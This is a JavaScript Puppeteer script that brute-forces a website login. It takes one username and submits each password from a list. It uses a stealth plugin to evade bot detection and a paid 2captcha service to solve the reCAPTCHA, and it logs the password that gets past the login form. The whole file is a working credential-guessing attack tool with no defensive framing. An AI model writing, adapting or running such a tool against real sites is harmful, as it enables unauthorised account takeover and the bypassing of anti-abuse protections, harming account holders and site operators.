const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const RecaptchaPlugin = require('puppeteer-extra-plugin-recaptcha');
const {siteLink, recaptchaKey, username, passwords} = require('./keys');
let browser;

const run = () => new Promise(async (resolve, reject) => {
  try {
    // Configure Puppeteer to use stealth plugin and recaptcha plugin
    configurePuppeteer();
    browser = await puppeteer.launch({headless: false});
    console.log('Bot Started...');
    
    for (let i = 0; i < passwords.length; i++) {
      console.log(`${i+1}/${passwords.length} - Trying password "${passwords[i]}"`);
      const success = await tryPassword(i);
      if (success) {
        console.log(`Correct Password is: ${passwords[i]}`);
      }
    }

    console.log('Bot Finished...');
    resolve(true);
  } catch (error) {
    if (browser) await browser.close();
    console.log(`Bot Run Error: ${error}`);
    reject(error);
  }
});

const tryPassword = (passIdx) => new Promise(async (resolve, reject) => {
  let page;
  try {
    page = await browser.newPage();
    await page.goto(siteLink, {timeout: 0, waitUntil: 'networkidle2'});
    await page.waitForSelector('input[name="username"]');
    
    await page.type('input[name="username"]', username);
    await page.type('input[name="password"]', passwords[passIdx]);

    await page.click('button[type="submit"]');

    await page.waitFor(10000);
    console.log('Solving reCaptcha');
    await page.solveRecaptchas();
    await page.waitFor(10000);

    const gotInput = await page.$('input[name="username"]');
    if (gotInput) {
      await page.close();
      resolve(false);
    } else {
      await page.close();
      resolve(true);
    }
  } catch (error) {
    if (page) await page.close();
    console.log('tryPassword Error: ', error);
    reject(error);
  }
});

function configurePuppeteer () {
  puppeteer.use(StealthPlugin());
  puppeteer.use(
    RecaptchaPlugin({
      provider: {
        id: '2captcha',
        token: recaptchaKey
      },
      visualFeedback: true
    })
  );
}

run();